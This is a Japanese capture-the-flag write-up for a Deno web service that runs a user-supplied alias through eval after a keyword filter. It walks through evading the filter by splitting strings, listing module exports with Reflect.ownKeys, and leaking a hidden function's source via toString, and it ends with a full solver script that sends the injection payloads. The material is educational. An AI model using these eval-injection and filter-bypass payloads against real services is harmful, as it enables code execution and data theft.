# writeup

### 方針

この問題は偽物のフラグに対して別名を設定できるだけのサービスになっています。本物のフラグは別ファイルに記載されています。ただし、別名を設定する際にはeval関数を使用することができます。該当コードを抜粋すると以下の箇所です。

```ts
const m: { [key: string]: string } = {
    "wonderful flag": "fake{wonderful_fake_flag}",
    "special flag": "fake{special_fake_flag}",
};
const key = await eval(waf(alias));
m[key] = flag.getFakeFlag();
return JSON.stringify(Object.entries(m), null, 2);
```

evalに与える文字列はwafを経由しています。wafでは以下のようにNGワードを設定しています。

```ts
const ngWords = [
    "eval",
    "Object",
    "proto",
    "require",
    "Deno",
    "flag",
    "ctf4b",
    "http",
];
```

もう一つ留意事項として、Denoはpermissionを設定しない限りはファイルの読み込みができません。実際、実行コマンドは`DENO_NO_PROMPT=1 deno run --allow-sys --allow-net --allow-env main.ts`となっています。そのため、本来はflag.tsの内容を取得することはできません。

しかし、import関数だけはpermissionをバイパスすることができます。ただし、バンドルされたファイルに限ります。この問題のimportはこのようになっています。

```ts
import * as flag from "./flag.ts";
```

つまり、flag.ts内の全exportが設定されているファイルはimport可能であることがわかります。そこで、うまいことflag.ts内の関数の情報を取得することができれば、本物のフラグを取得することができます。

### **FUNC_NAME_IS_REDACTED_PLEASE_RENAME_TO_RUN**関数の内容を取得

`m[key] = flag.getFakeFlag();`に注目すると、jsのmapはkeyにstring以外を入れるときに、toString()が呼ばれてからmapに代入されます。関数をtoString()すると、関数の情報として、関数内のコメントまで取得することができます。ただし、これが動作するのはDenoの<=1.42までになっています。

ここで、仮に関数名がわかったとします。その場合、import関数で関数を取得し、mapのkeyに代入させる際にtoString関数を実行させます。import関数はasync関数であるため、awaitを使いますが、evalはasync関数を実行できないため、Immediately-Invoked Function Expressionを使って実行します。

```ts
const secretFuncName = "????"
const payload = `(async() => {
  return (await import("./fl"+"ag.ts")).${secretFuncName}
})()`
return await fetch(`http://${HOST}:${PORT}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ alias: payload }),
  })
    .then((response) => {
      return response.json();
    })
    .then((data) => {
      return data;
    });
```

よって、次は関数名を取得する方法を考えます。

### 関数名の取得

関数名は公開されていないため、どうにかして取得する必要があります。

```ts
export function **FUNC_NAME_IS_REDACTED_PLEASE_RENAME_TO_RUN**() {
  // **REDACTED**
  return "**REDACTED**";
}

export function getFakeFlag() {
  return "fake{sorry. this isn't a flag. but, we wrote a flag in this file. try harder!}";
}
```

ここで、import関数の返り値に関数名が含まれていることに気づきます。関数名は列挙不可能なプロパティなプロパティとして設定されているため、Reflect.ownKeysを使って取得することができます。

```ts
const payload = `(async() => {
  const mod = await import("./fl"+"ag.ts");
  return Reflect.ownKeys(mod).map(k => k.toString())
})()`
```

よって以下のコードでフラグを取得することができます。

```ts
const PORT = Deno.env.get("PORT") || "80";
const HOST = Deno.env.get("HOST") || "localhost";

async function request(payload: string) {
  return await fetch(`http://${HOST}:${PORT}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ alias: payload }),
  })
    .then((response) => {
      return response.json();
    })
    .then((data) => {
      return data;
    });
}

const res1 = await request(`(async() => {
  const mod = await import("./fl"+"ag.ts");
  return Reflect.ownKeys(mod).map(k => k.toString())
})()`);
const secretFuncName = res1?.[2]?.[0].split(",")?.[1];
console.log({ secretFuncName });

if (!secretFuncName) {
  console.log("Failed to get secret function name");
  Deno.exit(1);
}

const res2 = await request(`(async() => {
  return (await import("./fl"+"ag.ts")).${secretFuncName}
})()`);
const flag = res2?.[2]?.[0].match(/ctf4b{.*}/)?.[0];
console.log({ flag });
```
